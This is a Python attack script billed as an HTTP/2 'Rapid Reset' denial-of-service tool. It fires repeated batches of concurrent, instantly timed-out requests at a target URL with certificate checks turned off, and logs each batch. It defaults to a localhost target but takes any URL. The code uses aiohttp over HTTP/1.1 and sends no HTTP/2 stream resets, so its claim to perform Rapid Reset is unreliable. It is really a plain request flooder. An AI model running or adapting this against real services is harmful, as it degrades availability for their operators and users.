import asyncio
import aiohttp
import ssl
import time
import logging
from datetime import datetime

# Configure logging for the attack script
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - ATTACK - %(message)s',
    handlers=[
        logging.FileHandler('attack.log'),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)

class RapidResetAttacker:
    def __init__(self, target_url, concurrent_streams=100):
        self.target_url = target_url
        self.concurrent_streams = concurrent_streams
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
    async def rapid_reset_stream(self, session, stream_id):
        """Send a request and immediately reset the stream"""
        try:
            # Start the request
            logger.debug(f"Starting stream {stream_id}")
            
            # Create request but immediately cancel/reset it
            async with session.get(f"{self.target_url}/api/data", 
                                 timeout=aiohttp.ClientTimeout(total=0.1)) as response:
                # Immediately close/reset the connection
                pass
                
        except asyncio.TimeoutError:
            logger.debug(f"Stream {stream_id} timed out (expected)")
        except Exception as e:
            logger.debug(f"Stream {stream_id} error: {e}")

    async def perform_attack(self, duration_seconds=30):
        """Perform the rapid reset attack"""
        logger.info(f"Starting Rapid Reset attack against {self.target_url}")
        logger.info(f"Duration: {duration_seconds} seconds")
        logger.info(f"Concurrent streams: {self.concurrent_streams}")
        
        connector = aiohttp.TCPConnector(
            ssl=self.ssl_context,
            limit=200,
            limit_per_host=200
        )
        
        timeout = aiohttp.ClientTimeout(total=0.1)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={"User-Agent": "RapidResetAttacker/1.0"}
        ) as session:
            
            start_time = time.time()
            stream_counter = 0
            
            while time.time() - start_time < duration_seconds:
                # Create multiple concurrent streams
                tasks = []
                for i in range(self.concurrent_streams):
                    stream_counter += 1
                    task = asyncio.create_task(
                        self.rapid_reset_stream(session, stream_counter)
                    )
                    tasks.append(task)
                
                # Wait for all streams to complete/timeout
                await asyncio.gather(*tasks, return_exceptions=True)
                
                logger.info(f"Completed batch of {self.concurrent_streams} streams. "
                           f"Total: {stream_counter}")
                
                # Brief pause before next batch
                await asyncio.sleep(0.1)
            
            logger.info(f"Attack completed. Total streams created: {stream_counter}")

async def main():
    attacker = RapidResetAttacker(
        target_url="https://127.0.0.1:8443",
        concurrent_streams=50  # Start with smaller number
    )
    
    await attacker.perform_attack(duration_seconds=20)

if __name__ == '__main__':
    asyncio.run(main())
